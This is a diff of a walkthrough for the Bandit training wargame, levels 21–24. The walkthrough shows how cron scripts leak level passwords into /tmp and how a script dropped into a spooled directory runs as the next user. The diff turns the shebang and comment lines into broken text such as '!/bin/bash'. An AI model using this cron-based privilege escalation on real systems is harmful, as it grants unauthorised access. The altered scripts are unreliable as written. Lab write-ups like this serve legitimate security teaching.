@@ -313,7 +313,7 @@ drwxr-xr-x 94 root root 4096 2013-03-18 15:53 ..
 bandit21@melissa:/etc/cron.d$ cat cronjob_bandit22
 * * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
 bandit21@melissa:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh
-#!/bin/bash
+!/bin/bash
 chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
 cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
 bandit21@melissa:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
@@ -337,7 +337,7 @@ eloi0             semtex0-32            semtex5      vortex20
 bandit22@melissa:/etc/cron.d$ cat cronjob_bandit23
 * * * * * bandit23 /usr/bin/cronjob_bandit23.sh &> /dev/null
 bandit22@melissa:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh
-#!/bin/bash
+!/bin/bash
  
 myname=$(whoami)
 mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
@@ -346,11 +346,11 @@ echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
  
 cat /etc/bandit_pass/$myname > /tmp/$mytarget
  
-#Run the script:
+Run the script:
 bandit22@melissa:/etc/cron.d$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
 8ca319486bfbbc3663ea0fbe81326349
  
-#Check contents of that file in /tmp:
+Check contents of that file in /tmp:
 bandit22@melissa:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
 
@@ -371,7 +371,7 @@ eloi0             semtex0-32            semtex5      vortex20
 bandit23@melissa:/etc/cron.d$ cat cronjob_bandit24
 * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
 bandit23@melissa:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
-#!/bin/bash
+!/bin/bash
  
 myname=$(whoami)
  
@@ -384,19 +384,19 @@ echo "Handling $i"
 rm -f $i
 done
  
-#Let's begin the process to create our script:
+Let's begin the process to create our script:
 bandit23@melissa:/etc/cron.d$ mkdir /tmp/cccc
 bandit23@melissa:/etc/cron.d$ cd /tmp/cccc
 bandit23@melissa:/tmp/cccc$ vi dump.sh
-     #!/bin/bash
+     !/bin/bash
      ls -la >> /tmp/cccc/list.txt
  
-#chmod 777 is probably overkill, this stuff gets erased.
+chmod 777 is probably overkill, this stuff gets erased.
 bandit23@melissa:/tmp/cccc$ chmod 777 dump.sh
 bandit23@melissa:/tmp/cccc$ chmod -R 777 /tmp/cccc
 bandit23@melissa:/tmp/cccc$ cp dump.sh /var/spool/bandit24/
  
-#Wait one minute for the cronjob to run then check our list.txt file:
+Wait one minute for the cronjob to run then check our list.txt file:
 bandit23@melissa:/tmp/cccc$ cat list.txt
 total 100
 drwxr-xr-x  2 root root 4096 2013-01-03 16:39 .
@@ -450,7 +450,7 @@ drwxr-xr-x  2 bandit23 bandit23  1024 2012-09-28 14:24 sub
 -rw-r--r--  1 bandit23 bandit23     3 2012-09-28 14:38 .t3
 drwxr-xr-x  2 bandit23 bandit23  1024 2012-11-27 17:46 zdenial
  
-#Nice, we see some interesting files, lets' go to this one:
+Nice, we see some interesting files, lets' go to this one:
 bandit23@melissa:/tmp/cccc$ cd  /var/spool/bandit24/pass
 bandit23@melissa:/var/spool/bandit24/pass$ ls
 pass
